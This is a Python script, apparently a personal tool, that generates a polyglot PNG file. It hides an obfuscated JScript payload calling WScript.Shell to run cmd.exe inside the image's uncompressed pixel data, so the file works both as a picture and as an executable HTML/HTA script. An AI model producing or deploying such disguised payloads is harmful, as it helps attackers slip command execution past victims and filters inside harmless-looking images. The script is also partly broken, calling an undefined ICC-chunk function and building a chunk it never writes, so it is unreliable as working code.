#from PIL import Image
#TODO split in 2 files
import sys
import png
import zlib
import struct

if len(sys.argv) < 2:
    print("Error: No arguments provided.", file=sys.stderr)
    sys.exit(1)

filename = sys.argv[1]
compression_method = zlib.Z_NO_COMPRESSION
payload = """
<script>
a="WScri"
b="pt.She"
c="ll"
new ActiveXObject(a+b+c).Run("cmd.exe")
</script>
"""

#payload = "Hello my name is fred <"
payload = payload.encode('ascii')

def createChunk(chunk_type, chunk_data):
    #https://www.w3.org/TR/png/#5Chunk-layout
    length = len(chunk_data)
    chunk = struct.pack('>I', length)
    chunk += chunk_type
    chunk += chunk_data
    crc = zlib.crc32(chunk_type + chunk_data)
    print(crc)
    chunk += struct.pack('>I', crc)
    return chunk


    
reader = png.Reader(filename=filename)
width, height, pixels, metadata = reader.asRGB()
pixels = list(pixels)
nRow = 0
row = pixels[nRow]
if len(payload) > len(row):
    print("Error: payload does not fit in row", file = sys.stderr)
    sys.exit(1)
row[0:len(payload)] = payload
pixels[nRow] = row

bdata = bytearray()
for row in pixels: 
    bdata.append(0) #every row first byte signal the filtering applied, 0 = none
    bdata.extend(row)
compressed = zlib.compress(bdata, level=compression_method)
idat_type = b"IDAT"
idat_chunk = createChunk(idat_type, compressed)

#https://www.w3.org/TR/PNG-Chunks.html
height = len(pixels)
width = int(len(pixels[0])/3)
bit_depth = 8
color_type = 2 #only color used
compression_method = 0
filter_method = 0
interlace_method = 0
idhr_data = struct.pack('>IIBBBBB', width, height, bit_depth, color_type, compression_method, filter_method, interlace_method)
idhr_type = b"IHDR"
idhr_chunk = createChunk(idhr_type, idhr_data)
iend_chunk = createChunk(b'IEND', b'')




# Create ICC with payload
icc_payload = b'Keep this profiel in tact at all costs!'
#icc_profile = inject_payload_into_icc("srgb.icc", icc_payload)
with open("srgb.icc", 'rb') as f:
    icc = bytearray(f.read())
icc_profile=bytes(icc)
iccp_chunk = create_iccp_chunk("sRGB v1.0", icc_profile)
with open(filename + "poly.png", 'wb') as f:
    f.write(b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A')
    f.write(idhr_chunk)
    f.write(idat_chunk)
    f.write(iend_chunk)
